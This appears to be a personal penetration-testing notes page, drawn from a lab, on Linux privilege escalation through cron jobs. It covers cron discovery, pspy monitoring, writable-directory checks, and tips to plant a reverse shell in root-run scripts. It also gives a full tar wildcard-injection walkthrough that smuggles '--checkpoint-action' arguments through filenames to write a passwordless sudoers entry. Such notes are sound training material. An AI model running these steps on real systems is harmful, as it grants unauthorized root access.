---
id: Scheduled Tasks
aliases: []
tags:
  - Linux/Privesc/Scheduled-Tasks
  - Linux/Privesc/Cron
---

# Scheduled Tasks

___

<!-- Discover Cron {{{-->
## Discover Cron

Discover Cron directories

```sh
ls -al /etc/cron*
```

```sh
ls -al /etc/cron.hourly/
```

```sh
ls -al /etc/cron.daily/
```

```sh
ls -al /etc/cron.weekly/
```

```sh
ls -al /etc/cron.monthly/
```

```sh
ls -al /var/spool/cron/crontabs/
```

List current user's Cron Jobs

```sh
crontab -l
```

```sh
cat /etc/crontab
```

### Pspy

[pspy](https://github.com/DominicBreuker/pspy)
monitors linux processes
(*e.g., commands run by other users, cron jobs, etc.*)
without `root` permissions,

```sh
./pspy64 -pf -i 1000
```

<!-- Info {{{-->
> [!info]-
>
> - `-p`: Print commands
> - `-i`: Print filesystem events
> - `-i 1000`: Scan [procfs](https://en.wikipedia.org/wiki/Procfs)
>    every second
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> - A Cron Job runs `/dmz-backups/backup.sh`
> - `backup.sh` creates a tarball file of the contents of `/var/www/html`
>
> ```sh
> pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
>
>
>      ██▓███    ██████  ██▓███ ▓██   ██▓
>     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
>     ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
>     ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
>     ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
>     ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
>     ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
>     ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
>                    ░           ░ ░     
>                                ░ ░     
>
> Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
> Draining file system events due to startup...
> done
> 2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
> 2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
> 2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
> 2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 
>
> <SNIP>
>
> 2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
> 2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
> 2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
> 2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
> 2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
> 2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
> 2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
> 2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
> 2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
> 2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
> 2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
> 2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
> 2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
> 2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
> 2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
> 2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
> 2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]-
>
> Add a [RevShell](https://www.revshells.com/)
> to the script to spawn a `root` shell
<!-- }}} -->

___
<!-- }}} -->

<!-- Vulnerabilities {{{-->
## Vulnerabilities

<!-- Write Privilege {{{-->
### Write Privilege

Check if the following directories have write privilege

- `/etc/cron.d`

```sh
test -w /etc/cron.d && echo "Writable" || echo "Not Writable"
```

```sh
find /etc/cron.d -type f -perm -0002 -ls
```

```sh
for g in $(id -Gn); do find /etc/cron.d -type f -perm -0020 -group "$g" -ls; done
```

- `/etc/cron.hourly`

```sh
test -w /etc/cron.hourly && echo "Writable" || echo "Not Writable"
```

- `/etc/cron.daily/`

```sh
test -w /etc/cron.daily && echo "Writable" || echo "Not Writable"
```

- `/etc/cron.weekly/`

```sh
test -w /etc/cron.weekly && echo "Writable" || echo "Not Writable"
```

- `/etc/cron.monthly/`

```sh
test -w /etc/cron.monthly && echo "Writable" || echo "Not Writable"
```

- `/etc/crontab`

```sh
test -w /etc/crontab && echo "Writable" || echo "Not Writable"
```

- `/var/spool/cron/crontabs/root`

```sh
test -w /var/spool/cron/crontabs/root && echo "Writable" || echo "Not Writable"
```


> [!todo]
>
> To add Cron Jobs, write a bash script executing a reverse shell command

> [!tip]
>
> Find [[Directory & File#Writeable Directories|Writeable Directories]] &
> [[Directory & File#Writeable|Writeable Files]]

<!-- }}} -->

<!-- Wildcard Abuse {{{-->
### Wildcard Abuse

Wildcards in Cron Jobs may expand filenames to command arguments

<!-- Example {{{-->
> [!example]-
>
> Cron Job to back up the `home/htb-student` directory
> to a compressed archive every minute
>
> ```sh
> #
> #
> mh dom mon dow command
> */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
> ```
<!-- }}} -->

The [tar](https://linux.die.net/man/1/tar) command allows
to execute a shell command when `checkpoint` is set

<!-- Example {{{-->
> [!example]-
>
> ```sh
> man tar
> ```
>
> ```sh
> <SNIP>
> Informative output
>        --checkpoint[=N]
>               Display progress messages every Nth record (default 10).
>
>        --checkpoint-action=ACTION
>               Run ACTION on each checkpoint.
> ```
<!-- }}} -->

Write out the command names as filenames


<!-- Example {{{-->
> [!example]-
>
> ```sh
> htb-student@NIX02:~$ ls -la
> ```
>
> ```sh
> total 56
> drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
> drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
> -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
> -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
> -rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
> -rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
> ```
<!-- }}} -->

1. `root.sh`: Add the user to sudoers

```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

2. `--checkpoint=1`: Set tar checkpoint to `1`

```sh
echo "" > --checkpoint=1
```

3. `--checkpoint-action=exec=sh root.sh`:
   Execute `root.sh` on tar checkpoint

```sh
echo "" > "--checkpoint-action=exec=sh root.sh"
```

The wildcard be interpreted and expanded by the shell
to execute the arbitrary code

```sh
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz
--checkpoint=1 --checkpoint-action=exec=sh root.sh
```

`root.sh` adds the user to `/etc/sudoers`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo -l
> ```
> ```sh
> Matching Defaults entries for htb-student on NIX02:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User htb-student may run the following commands on NIX02:
>     (root) NOPASSWD: ALL
> ```
<!-- }}} -->

<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
